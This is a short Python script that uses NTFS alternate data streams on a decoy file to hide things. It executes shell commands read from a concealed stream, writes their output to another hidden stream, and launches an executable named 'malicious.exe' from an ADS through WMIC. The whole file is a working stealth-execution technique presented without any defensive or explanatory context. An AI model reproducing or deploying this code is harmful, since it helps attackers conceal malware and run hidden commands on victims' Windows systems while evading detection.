import os

def buildADSFilename(filename,streamname):
	return filename+":"+streamname

decoy = "benign.text"
resultfile = buildADSFilename(decoy,"results.txt")
commandfile = buildADSFilename(decoy,"commands.txt")

with open(commandfile,"r") as c:
	for line in c:
		os.system(line.strip() + " >> " + resultfile)

exefile = "malicious.exe"
exepath = os.path.join(os.getcwd(), buildADSFilename(decoy,exefile))
os.system ("wmic process call create "+exepath)

